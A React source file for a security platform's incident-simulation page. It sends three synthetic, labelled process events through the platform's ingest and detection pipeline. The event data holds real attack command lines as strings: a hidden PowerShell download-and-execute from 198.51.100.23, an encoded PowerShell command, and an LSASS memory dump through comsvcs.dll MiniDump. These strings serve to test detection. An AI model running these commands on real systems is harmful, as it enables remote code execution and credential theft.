import { FlaskConical, Play } from "lucide-react";
import { useState } from "react";
import { useQueryClient } from "@tanstack/react-query";
import { api, errorMessage } from "../api/client";
import { Button, ButtonLink, Card, Field, Input, OrganizationSelect, PageHeader, useDefaultOrganization } from "../components";
import { useDocumentTitle } from "../hooks/useDocumentTitle";

const POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
const WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";

function at(minutesAgo: number): string {
  return new Date(Date.now() - minutesAgo * 60_000).toISOString();
}

function processEvent(host: string, minutesAgo: number, path: string, cmd: string, parent: string) {
  return {
    timestamp: at(minutesAgo),
    source: { kind: "endpoint", product: "bloody-simulator", sensorId: "simulator" },
    category: "process",
    eventType: "process_start",
    action: "start",
    asset: { hostname: host, os: "Windows 11 Enterprise" },
    user: { name: "sim.user", domain: "CORP" },
    process: { name: path.split("\\").pop(), path, commandLine: cmd, parent: { path: parent, name: parent.split("\\").pop() } },
    labels: { simulated: "true" },
    provenance: { adapter: "bloody-simulator", adapterVersion: "1", receivedAt: new Date().toISOString() },
  };
}

/** A realistic but harmless credential-theft chain: Office → PowerShell download → encoded PowerShell → LSASS dump. */
export function credentialTheftScenario(host: string) {
  return [
    processEvent(host, 6, POWERSHELL, "powershell -w hidden -c iwr http://198.51.100.23/inv.ps1|iex", WINWORD),
    processEvent(host, 5, POWERSHELL, "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", POWERSHELL),
    processEvent(host, 4, "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Users\\Public\\debug.bin full", POWERSHELL),
  ];
}

export default function SimulateIncidentPage() {
  useDocumentTitle("Simulate an incident");
  const queryClient = useQueryClient();
  const defaultOrg = useDefaultOrganization("event:ingest");
  const [orgId, setOrgId] = useState<string | null>(null);
  const [host, setHost] = useState("ws-demo-01");
  const [state, setState] = useState<{ kind: "idle" | "running" | "done" | "error"; message?: string }>({ kind: "idle" });
  const organizationId = orgId ?? defaultOrg ?? null;

  async function run() {
    if (!organizationId) return;
    setState({ kind: "running" });
    try {
      const res = await api.post<{ accepted?: number }>("/ingest/events", { organizationId, events: credentialTheftScenario(host.trim() || "ws-demo-01") });
      await queryClient.invalidateQueries();
      setState({ kind: "done", message: `${res.accepted ?? 3} events ingested. Detections and correlation run in the background — the incident appears within a few seconds.` });
    } catch (err) {
      setState({ kind: "error", message: errorMessage(err) });
    }
  }

  return (
    <div className="space-y-4">
      <PageHeader title="Simulate an incident" subtitle="Send a harmless, labelled attack chain through the real ingest → detection → correlation pipeline to see SCIAT end to end." />
      <Card title={<span className="inline-flex items-center gap-2"><FlaskConical className="h-4 w-4" aria-hidden /> Credential-theft chain</span>}>
        <div className="space-y-4 text-sm">
          <ol className="list-decimal space-y-1 pl-5 text-muted">
            <li>Word spawns PowerShell that downloads a script (T1059.001)</li>
            <li>Encoded, hidden PowerShell runs (T1027)</li>
            <li>rundll32 + comsvcs.dll MiniDump of LSASS (T1003.001)</li>
          </ol>
          <div className="grid gap-3 sm:grid-cols-2">
            <Field label="Organization">{(f) => <OrganizationSelect id={f.id} value={organizationId} onChange={setOrgId} permission="event:ingest" />}</Field>
            <Field label="Target hostname">{(f) => <Input {...f} value={host} onChange={(e) => setHost(e.target.value)} maxLength={120} />}</Field>
          </div>
          <p className="text-xs text-muted">Events are tagged <span className="font-mono">simulated=true</span> and touch no real endpoint.</p>
          <div className="flex items-center gap-3">
            <Button variant="primary" icon={Play} loading={state.kind === "running"} onClick={() => void run()} disabled={!organizationId}>
              Run simulation
            </Button>
            {state.kind === "done" && <ButtonLink to="/incidents" size="sm">Open incidents</ButtonLink>}
          </div>
          {state.message && (
            <p role="status" className={state.kind === "error" ? "text-red-600" : "text-emerald-700 dark:text-emerald-400"}>
              {state.message}
            </p>
          )}
        </div>
      </Card>
    </div>
  );
}
